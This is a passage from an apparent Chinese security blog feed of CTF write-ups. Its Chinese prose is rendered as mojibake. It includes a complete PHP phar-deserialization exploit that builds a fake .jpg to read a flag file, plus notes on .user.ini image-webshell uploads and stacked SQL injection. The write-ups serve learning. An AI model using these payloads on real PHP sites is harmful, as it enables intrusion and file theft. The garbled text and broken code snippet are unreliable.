sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"ss"</span>, $username, $password);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($expect);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($expect) &amp;&amp; $expect === $password) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        $filenames = scandir($path);</span><br><span class="line"></span><br><span class="line">        $key = array_search(<span class="string">"."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line">        $key = array_search(<span class="string">".."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($filenames <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">            $file = <span class="keyword">new</span> File();</span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, $file);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $table = <span class="string">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;thead&gt;&lt;tr&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;'</span> . htmlentities($func) . <span class="string">'&lt;/th&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;/thead&gt;&lt;tbody&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;tr&gt;'</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">                $table .= <span class="string">'&lt;td class="text-center"&gt;'</span> . htmlentities($value) . <span class="string">'&lt;/td&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= <span class="string">'&lt;td class="text-center" filename="'</span> . htmlentities($filename) . <span class="string">'"&gt;&lt;a href="#" class="download"&gt;ä¸‹è½½&lt;/a&gt; / &lt;a href="#" class="delete"&gt;åˆ é™¤&lt;/a&gt;&lt;/td&gt;'</span>;</span><br><span class="line">            $table .= <span class="string">'&lt;/tr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $size = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        $units = <span class="keyword">array</span>(<span class="string">' B'</span>, <span class="string">' KB'</span>, <span class="string">' MB'</span>, <span class="string">' GB'</span>, <span class="string">' TB'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $size &gt;= <span class="number">1024</span> &amp;&amp; $i &lt; <span class="number">4</span>; $i++) $size /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round($size, <span class="number">2</span>).$units[$i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è·Ÿè¿›Fileç±»çš„open()æ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å‘ç°å­˜åœ¨<code>file_exists($filename)</code>ï¼Œæ ¹æ®å‰ç½®çŸ¥è¯†å¯ä»¥çŸ¥é“ï¼Œè¿™é‡Œçš„<code>$filename</code>å¦‚æœæˆ‘ä»¬ä¼ å…¥<code>phar://</code>ä¼ªåè®®çš„è¯ä¼šè§¦å‘ååºåˆ—åŒ–ï¼Œæ¥ä¸‹æ¥çš„é—®é¢˜å°±æ˜¯å¯»æ‰¾åˆ©ç”¨ç‚¹ã€‚</p><p>åŒæ ·åœ¨Fileç±»ï¼Œå‘ç°å­˜åœ¨<code>$this-&gt;close()</code>æ–¹æ³•å¯ä»¥è¯»å–æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åœ¨FileListç±»ä¸­ï¼Œæœ‰__call()é­”æ³•å‡½æ•°ï¼Œå½“FileListç±»çš„å®ä¾‹è°ƒç”¨æœ¬ç±»ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ï¼ŒFileç±»çš„$fileå®ä¾‹å°†ä¼šè°ƒç”¨è¯¥æ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        $filenames = scandir($path);</span><br><span class="line"></span><br><span class="line">        $key = array_search(<span class="string">"."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line">        $key = array_search(<span class="string">".."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($filenames <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">            $file = <span class="keyword">new</span> File();  <span class="comment"># Fileå¯¹è±¡</span></span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, $file);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); <span class="comment"># $file-&gt;close()</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ......ç•¥</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†çœ‹Userç±»ï¼Œå‘ç°å®ƒæœ€åä¼šè°ƒç”¨ä¸€ä¸ªclose()æ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ......ç•¥</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ•´ç†æ€è·¯ï¼šå®ä¾‹åŒ–Userç±»ï¼Œä»¤$dbä¸ºä¸€ä¸ªFileListç±»çš„å¯¹è±¡ï¼Œä½†æ˜¯FileListç±»æ²¡æœ‰close()æ–¹æ³•ï¼Œå°†ä¼šè°ƒç”¨__call()æ–¹æ³•ï¼Œè€Œcall()æ–¹æ³•ä¼šè°ƒç”¨Fileå¯¹è±¡çš„close()æ–¹æ³•ï¼Œé‡å†™$filenameï¼Œä½¿file_get_contents($filename)è¯»å–æŒ‡å®šæ–‡ä»¶ï¼Œæœ€åFileListå¯¹è±¡è°ƒç”¨__destruct()ï¼Œå°†å‡½æ•°æ‰§è¡Œç»“æœæ‰“å°å‡ºæ¥ã€‚</strong></p><p><strong>æ³¨æ„ï¼šè¿™é‡Œå¯èƒ½æœ‰äººå’Œæˆ‘ä¹‹å‰æƒ³çš„ä¸€æ ·ï¼šç›´æ¥è®©$dbèµ‹å€¼ä¸ºFileå¯¹è±¡ä¸å°±è¡Œäº†ï¼Ÿä½†æ˜¯è¿™æ ·ä¸ä¼šè°ƒç”¨__destruct()å°†å‡½æ•°è¯»å–çš„å†…å®¹è¿”å›ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»è¦åˆ©ç”¨åˆ°FileListå¯¹è±¡</strong></p><p>Expï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//1. ç”¨è¿™ä¸ªæ„é€ ä¸€ä¸ª phar.phar</span></span><br><span class="line"><span class="comment">//2. é‡å‘½åä¸º phar.jpgï¼Œä¼ ä¸Šå»</span></span><br><span class="line"><span class="comment">//3. POST è®¿é—® /delete.php ï¼Œfilename = phar://phar.jpg/</span></span><br><span class="line"><span class="comment">//4. flag åˆ°æ‰‹~</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File();</span><br><span class="line">        $file-&gt;filename = <span class="string">'/flag.txt'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line">ini_set(<span class="string">'phar.readonly'</span>,<span class="number">0</span>);</span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$o-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"exp.txt"</span>, <span class="string">"glzjin"</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ é™¤æ–‡ä»¶æ—¶æŠ“åŒ…ï¼Œphar://åè®®è®¿é—®æŒ‡å®šæ–‡ä»¶è¯»å–flagï¼š</p><p><img src="https://t1.picb.cc/uploads/2019/08/27/gbTbgg.png" alt=""></p><p><strong>PSï¼š</strong><code>php://filter/resource=phar://</code>ä¹‹ç±»çš„ä¼ªåè®®å¯ä»¥ç”¨æ¥ç»•è¿‡é™åˆ¶å¼€å¤´ä¸èƒ½ä¸º<code>phar://</code>ï¼ˆå‚è€ƒSUCTF upload 2ï¼‰ï¼Œè¿™é‡Œå°è¯•å¤±è´¥ï¼Œä½†è¿˜æ˜¯è®°å½•ä¸€ä¸‹ã€‚</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://xz.aliyun.com/t/2715" target="_blank" rel="noopener">åˆæ¢phar://</a></p><p><a href="https://www.cnblogs.com/kevinbruce656/p/11316070.html" target="_blank" rel="noopener">ciscn2019ååŒ—èµ›åŒºåŠå†³èµ›day1_web1é¢˜è§£</a></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å¤ç° SUCTF Upload 2å¤±è´¥2333ï¼Œè¿˜æ˜¯tclã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;ä»Šå¤©å¤ç°æ—¶å‘ç°è‡ªå·±å…³äºpharååºåˆ—åŒ–äº†è§£å¾—ä¸å¤Ÿï¼Œç‰¹åœ°è®°å½•ä¸€ä¸‹åŠ æ·±å°è±¡ã€‚&lt;/p&gt;
&lt;h2 id=&quot;å‰ç½®çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#å‰ç½®çŸ¥è¯†&quot;
      
    
    </summary>
    
    
    
      <category term="Web" scheme="https://www.sketchplane.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>SUCTF Webéƒ¨åˆ†</title>
    <link href="https://www.sketchplane.top/2019/08/23/SUCTF-Web%E9%83%A8%E5%88%86/"/>
    <id>https://www.sketchplane.top/2019/08/23/SUCTF-Web%E9%83%A8%E5%88%86/</id>
    <published>2019-08-23T12:16:49.000Z</published>
    <updated>2019-08-26T03:19:00.210Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å‰å‡ å¤©æ‰“çš„ä¸€ä¸ªæ¯”èµ›ï¼Œæœ‰äº›è‡ªé—­ï¼Œè¶ç€æœ‰æ—¶é—´ï¼ˆX-NCUAåšä¸å‡ºæ¥2333ï¼‰æ¥å¤ç°ä¸€ä¸‹ã€‚</p><h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>åç¼€è¿‡æ»¤äº†.php/.phtmlç­‰ç­‰ï¼Œä½†æ˜¯.php./.user.iniå¯ä»¥ä¸Šä¼ ï¼›å†…å®¹è¿‡æ»¤äº†&lt;?ï¼Œå¦å¤–æœ‰exif_imagetype()ç›‘æµ‹æ˜¯å¦ä¸ºå›¾ç‰‡ã€‚</p><p><strong>è§£é¢˜æ€è·¯ï¼š</strong>è¿™é‡Œç›´æ¥ç»™å‡ºPç‰›çš„<a href="http://www.vuln.cn/6001" target="_blank" rel="noopener">æ–‡ç« </a>ï¼Œåˆ©ç”¨.user.iniè®¾ç½®è‡ªåŠ¨åŒ…å«æˆ‘ä»¬äº‹å…ˆä¸Šä¼ å¥½çš„å›¾ç‰‡é©¬ï¼Œè®¿é—®ä¸Šä¼ ç›®å½•ä¸Šçš„<code>index.php</code>æ‰§è¡Œå‘½ä»¤å³å¯è¯»å–flagã€‚</p><p><strong>æ³¨æ„ï¼š</strong>è¿™ä¸ªæ–¹æ³•æœ‰ä¸€ä¸ªå‰æï¼Œæ­£å¦‚Pç‰›æ–‡ç« é‡Œè¯´çš„ï¼Œéœ€è¦ä¸Šä¼ ç›®å½•å­˜åœ¨ä¸€ä¸ªphpæ–‡ä»¶(å³æœ¬é¢˜ä¸Šä¼ ç›®å½•ä¸­çš„index.php)æ‰èƒ½åŒ…å«ä¸Šä¼ çš„å›¾ç‰‡é©¬ã€‚</p><p><img src="https://t1.picb.cc/uploads/2019/08/23/gaEPjd.png" alt=""></p><h2 id="Pythonginx"><a href="#Pythonginx" class="headerlink" title="Pythonginx"></a>Pythonginx</h2><p>è¿™é“é¢˜è€ƒçš„<code>Unicode</code>ç¼–ç é—®é¢˜ï¼Œå‚è€ƒ<code>Black Hat 2019</code>çš„PPTï¼š<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">Black Hat 2019</a></p><p>å†æ ¹æ®æç¤ºå°è¯•è®¿é—®nginxçš„é…ç½®æ–‡ä»¶ï¼š</p><p><img src="https://t1.picb.cc/uploads/2019/08/25/gbC65J.png" alt=""></p><p>è¯»<code>/usr/fffffflag</code>è·å–flagï¼š</p><p><img src="https://t1.picb.cc/uploads/2019/08/25/gbCIS0.png" alt=""></p><h2 id="easySql"><a href="#easySql" class="headerlink" title="easySql"></a>easySql</h2><p>äººå·¥Fuzzäº†ä¸€ä¸‹ï¼Œå‘ç°å¯ä»¥å †å æ³¨å…¥ï¼Œçˆ†äº†ä¸€æ³¢åº“åå’Œè¡¨åï¼šctf â€“&gt; Flag</p><p><img src="https://t1.picb.cc/uploads/2019/08/25/gbcjFL.png" alt=""></p><p>ä½†æ˜¯è¿‡æ»¤äº†<code>flagå’Œfrom</code>ï¼Œæ²¡æœ‰åŠæ³•ç›´æ¥æŸ¥å‡ºflagã€‚</p><p><strong>çœ‹wpè¯´æœ‰æºç æ³„éœ²ï¼Œ2333</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">    $post = <span class="keyword">array</span>();</span><br><span class="line">    $get = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">global</span> $MysqlLink;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//GetPara();</span></span><br><span class="line">    $MysqlLink = mysqli_connect(<span class="string">"localhost"</span>,$datauser,$datapass);</span><br><span class="line">    <span class="keyword">if</span>(!$MysqlLink)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Mysql Connect Error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $selectDB = mysqli_select_db($MysqlLink,$dataName);</span><br><span class="line">    <span class="keyword">if</span>(!$selectDB)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Choose Database Error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($v)&amp;&amp;is_string($v))&#123;</span><br><span class="line">            $post[$k] = trim(addslashes($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//die();</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span 